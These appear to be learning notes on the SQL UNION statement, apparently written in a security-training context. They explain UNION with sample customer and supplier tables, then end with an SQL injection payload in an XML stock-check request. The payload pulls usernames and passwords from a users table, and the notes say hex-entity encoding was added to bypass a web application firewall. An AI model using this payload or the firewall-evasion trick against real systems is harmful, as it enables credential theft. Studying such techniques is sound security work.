The UNION statement combines the results of two or more SELECT statements to retrieve data from either single or multiple tables; the rules to this query are that the UNION statement must retrieve the same number of columns in each SELECT statement, the columns have to be of a similar data type and the column order has to be the same. This might sound not very clear, so let's use the following analogy. Say a company wants to create a list of addresses for all customers and suppliers to post a new catalogue. We have one table called customers with the following contents:  

  

|   |   |   |   |   |
|---|---|---|---|---|
|**id**|**name**|**address**|**city**|**postcode**|
|1|Mr John Smith|123 Fake Street|Manchester|M2 3FJ|
|2|Mrs Jenny Palmer|99 Green Road|Birmingham|B2 4KL|
|3|Miss Sarah Lewis|15 Fore Street|London|NW12 3GH|

And another called suppliers with the following contents:

  

|   |   |   |   |   |
|---|---|---|---|---|
|**id**|**company**|**address**|**city**|**postcode**|
|1|Widgets Ltd|Unit 1a, Newby Estate|Bristol|BS19 4RT|
|2|The Tool Company|75 Industrial Road|Norwich|N22 3DR|
|3|Axe Makers Ltd|2b Makers Unit, Market Road|London|SE9 1KK|

Using the following SQL Statement, we can gather the results from the two tables and put them into one result set:

  

`SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;`  

  

|   |   |   |   |
|---|---|---|---|
|**name**|**address**|**city**|**postcode**|
|Mr John Smith|123 Fake Street|Manchester|M2 3FJ|
|Mrs Jenny Palmer|99 Green Road|Birmingham|B2 4KL|
|Miss Sarah Lewis|15 Fore Street|London|NW12 3GH|
|Widgets Ltd|Unit 1a, Newby Estate|Bristol|BS19 4RT|
|The Tool Company|75 Industrial Road|Norwich|N22 3DR|
|Axe Makers Ltd|2b Makers Unit, Market Road|London|SE9 1KK|
SQLi in a XML request

`<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId><@hex_entities>1 UNION SELECT username || ' ' ||password from users--</@hex_entities></storeId></stockCheck>`

using hackvertor we added the hex_entities to bypass the waff